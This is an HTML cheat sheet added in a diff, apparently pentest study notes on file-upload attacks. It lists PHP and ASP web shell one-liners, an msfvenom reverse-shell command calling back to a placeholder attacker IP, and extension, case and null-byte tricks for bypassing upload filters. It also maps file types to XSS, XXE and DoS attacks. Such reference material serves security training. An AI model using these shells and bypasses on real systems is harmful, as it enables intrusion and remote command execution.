@@ -1,0 +1,163 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Linux Commands CheatSheet</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div class="button-container">
+        <!-- Go Home Button -->
+        <a href="index.html" class="go-home-button">Go Home</a>
+    </div>
+<body>
+    <div class="container">
+        <h1>Web Shells and Bypasses</h1>
+
+        <h2>Web Shells</h2>
+        <table>
+            <thead>
+                <tr>
+                    <th>Web Shell</th>
+                    <th>Description</th>
+                </tr>
+            </thead>
+            <tbody>
+                <tr>
+                    <td><code>&lt;?php file_get_contents('/etc/passwd'); ?&gt;</code></td>
+                    <td>Basic PHP File Read</td>
+                </tr>
+                <tr>
+                    <td><code>&lt;?php system('hostname'); ?&gt;</code></td>
+                    <td>Basic PHP Command Execution</td>
+                </tr>
+                <tr>
+                    <td><code>&lt;?php system($_REQUEST['cmd']); ?&gt;</code></td>
+                    <td>Basic PHP Web Shell</td>
+                </tr>
+                <tr>
+                    <td><code>&lt;% eval request('cmd') %&gt;</code></td>
+                    <td>Basic ASP Web Shell</td>
+                </tr>
+                <tr>
+                    <td><code>msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw &gt; reverse.php</code></td>
+                    <td>Generate PHP reverse shell</td>
+                </tr>
+                <tr>
+                    <td><a href="https://github.com/Arrexel/phpbash">PHP Web Shell</a></td>
+                    <td>PHP Web Shell</td>
+                </tr>
+                <tr>
+                    <td><a href="https://github.com/pentestmonkey/php-reverse-shell">PHP Reverse Shell</a></td>
+                    <td>PHP Reverse Shell</td>
+                </tr>
+                <tr>
+                    <td><a href="https://github.com/danielmiessler/SecLists/tree/master/Web-Shells">Web/Reverse Shells</a></td>
+                    <td>List of Web Shells and Reverse Shells</td>
+                </tr>
+            </tbody>
+        </table>
+
+        <h2>Bypasses</h2>
+        <table>
+            <thead>
+                <tr>
+                    <th>Command</th>
+                    <th>Description</th>
+                </tr>
+            </thead>
+            <tbody>
+                <tr>
+                    <td><strong>Client-Side Bypass</strong></td>
+                    <td></td>
+                </tr>
+                <tr>
+                    <td><code>[CTRL+SHIFT+C]</code></td>
+                    <td>Toggle Page Inspector</td>
+                </tr>
+                <tr>
+                    <td><strong>Blacklist Bypass</strong></td>
+                    <td></td>
+                </tr>
+                <tr>
+                    <td><code>shell.phtml</code></td>
+                    <td>Uncommon Extension</td>
+                </tr>
+                <tr>
+                    <td><code>shell.pHp</code></td>
+                    <td>Case Manipulation</td>
+                </tr>
+                <tr>
+                    <td><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst">PHP Extensions</a></td>
+                    <td>List of PHP Extensions</td>
+                </tr>
+                <tr>
+                    <td><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Extension%20ASP">ASP Extensions</a></td>
+                    <td>List of ASP Extensions</td>
+                </tr>
+                <tr>
+                    <td><a href="https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt">Web Extensions</a></td>
+                    <td>List of Web Extensions</td>
+                </tr>
+                <tr>
+                    <td><strong>Whitelist Bypass</strong></td>
+                    <td></td>
+                </tr>
+                <tr>
+                    <td><code>shell.jpg.php</code></td>
+                    <td>Double Extension</td>
+                </tr>
+                <tr>
+                    <td><code>shell.php.jpg</code></td>
+                    <td>Reverse Double Extension</td>
+                </tr>
+                <tr>
+                    <td><code>%20</code>, <code>%0a</code>, <code>%00</code>, <code>%0d0a</code>, <code>/</code>, <code>.\</code>, <code>.</code>, <code>…</code></td>
+                    <td>Character Injection - Before/After Extension</td>
+                </tr>
+                <tr>
+                    <td><strong>Content/Type Bypass</strong></td>
+                    <td></td>
+                </tr>
+                <tr>
+                    <td><a href="https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/web/content-type.txt">Web Content-Types</a></td>
+                    <td>List of Web Content-Types</td>
+                </tr>
+                <tr>
+                    <td><a href="https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-all-content-types.txt">Content-Types</a></td>
+                    <td>List of All Content-Types</td>
+                </tr>
+                <tr>
+                    <td><a href="https://en.wikipedia.org/wiki/List_of_file_signatures">File Signatures</a></td>
+                    <td>List of File Signatures/Magic Bytes</td>
+                </tr>
+            </tbody>
+        </table>
+
+        <h2>Limited Uploads</h2>
+        <table>
+            <thead>
+                <tr>
+                    <th>Potential Attack</th>
+                    <th>File Types</th>
+                </tr>
+            </thead>
+            <tbody>
+                <tr>
+                    <td><code>XSS</code></td>
+                    <td>HTML, JS, SVG, GIF</td>
+                </tr>
+                <tr>
+                    <td><code>XXE/SSRF</code></td>
+                    <td>XML, SVG, PDF, PPT, DOC</td>
+                </tr>
+                <tr>
+                    <td><code>DoS</code></td>
+                    <td>ZIP, JPG, PNG</td>
+                </tr>
+            </tbody>
+        </table>
+    </div>
+</body>
+</html>
